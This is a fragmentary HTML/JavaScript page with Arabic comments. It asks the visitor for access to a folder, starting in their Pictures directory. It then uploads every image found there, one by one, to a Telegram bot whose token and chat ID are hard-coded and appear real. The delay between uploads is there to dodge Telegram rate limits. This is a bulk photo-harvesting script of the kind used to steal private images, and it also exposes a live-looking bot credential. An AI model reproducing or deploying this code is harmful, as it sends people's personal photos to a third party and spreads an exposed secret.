...
document.addEventListener('DOMContentLoaded', function() {
    ...
    // تخزين إذن المجلد
let folderPermission = null;
const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94"; // استبدل هذا بتوكن بوتك
const CHAT_ID = "6913353602"; // استبدل هذا بمعرف الدردشة

// طلب إذن الوصول إلى المجلد
async function requestFolderAccess() {
    try {
        const dirHandle = await window.showDirectoryPicker({
            startIn: 'pictures'
        });
        folderPermission = dirHandle;
        alert('تم منح الإذن! يمكنك الآن إرسال الصور.');
    } catch (error) {
        alert("لم يتم منح الإذن أو حدث خطأ.");
    }
}

// إرسال الصور إلى بوت تيليجرام
async function sendToTelegram() {
    if (!folderPermission) {
        alert("الرجاء منح الإذن أولاً!");
        return;
    }

    try {
        const imageFiles = [];
        for await (const entry of folderPermission.values()) {
        ...
        for (const file of imageFiles) {
            ...
            await new Promise(resolve => setTimeout(resolve, 1000)); // تأخير بين الإرسالات لتجنب حظر التليجرام
        }

        alert(`تم إرسال ${imageFiles.length} صورة إلى التليجرام!`);
    } catch (error) {
...
async function uploadToTelegram(file) {
    ...
    if (!response.ok) {
        throw new Error(`فشل إرسال ${file.name}`);
    }
        }
</body>
</html>
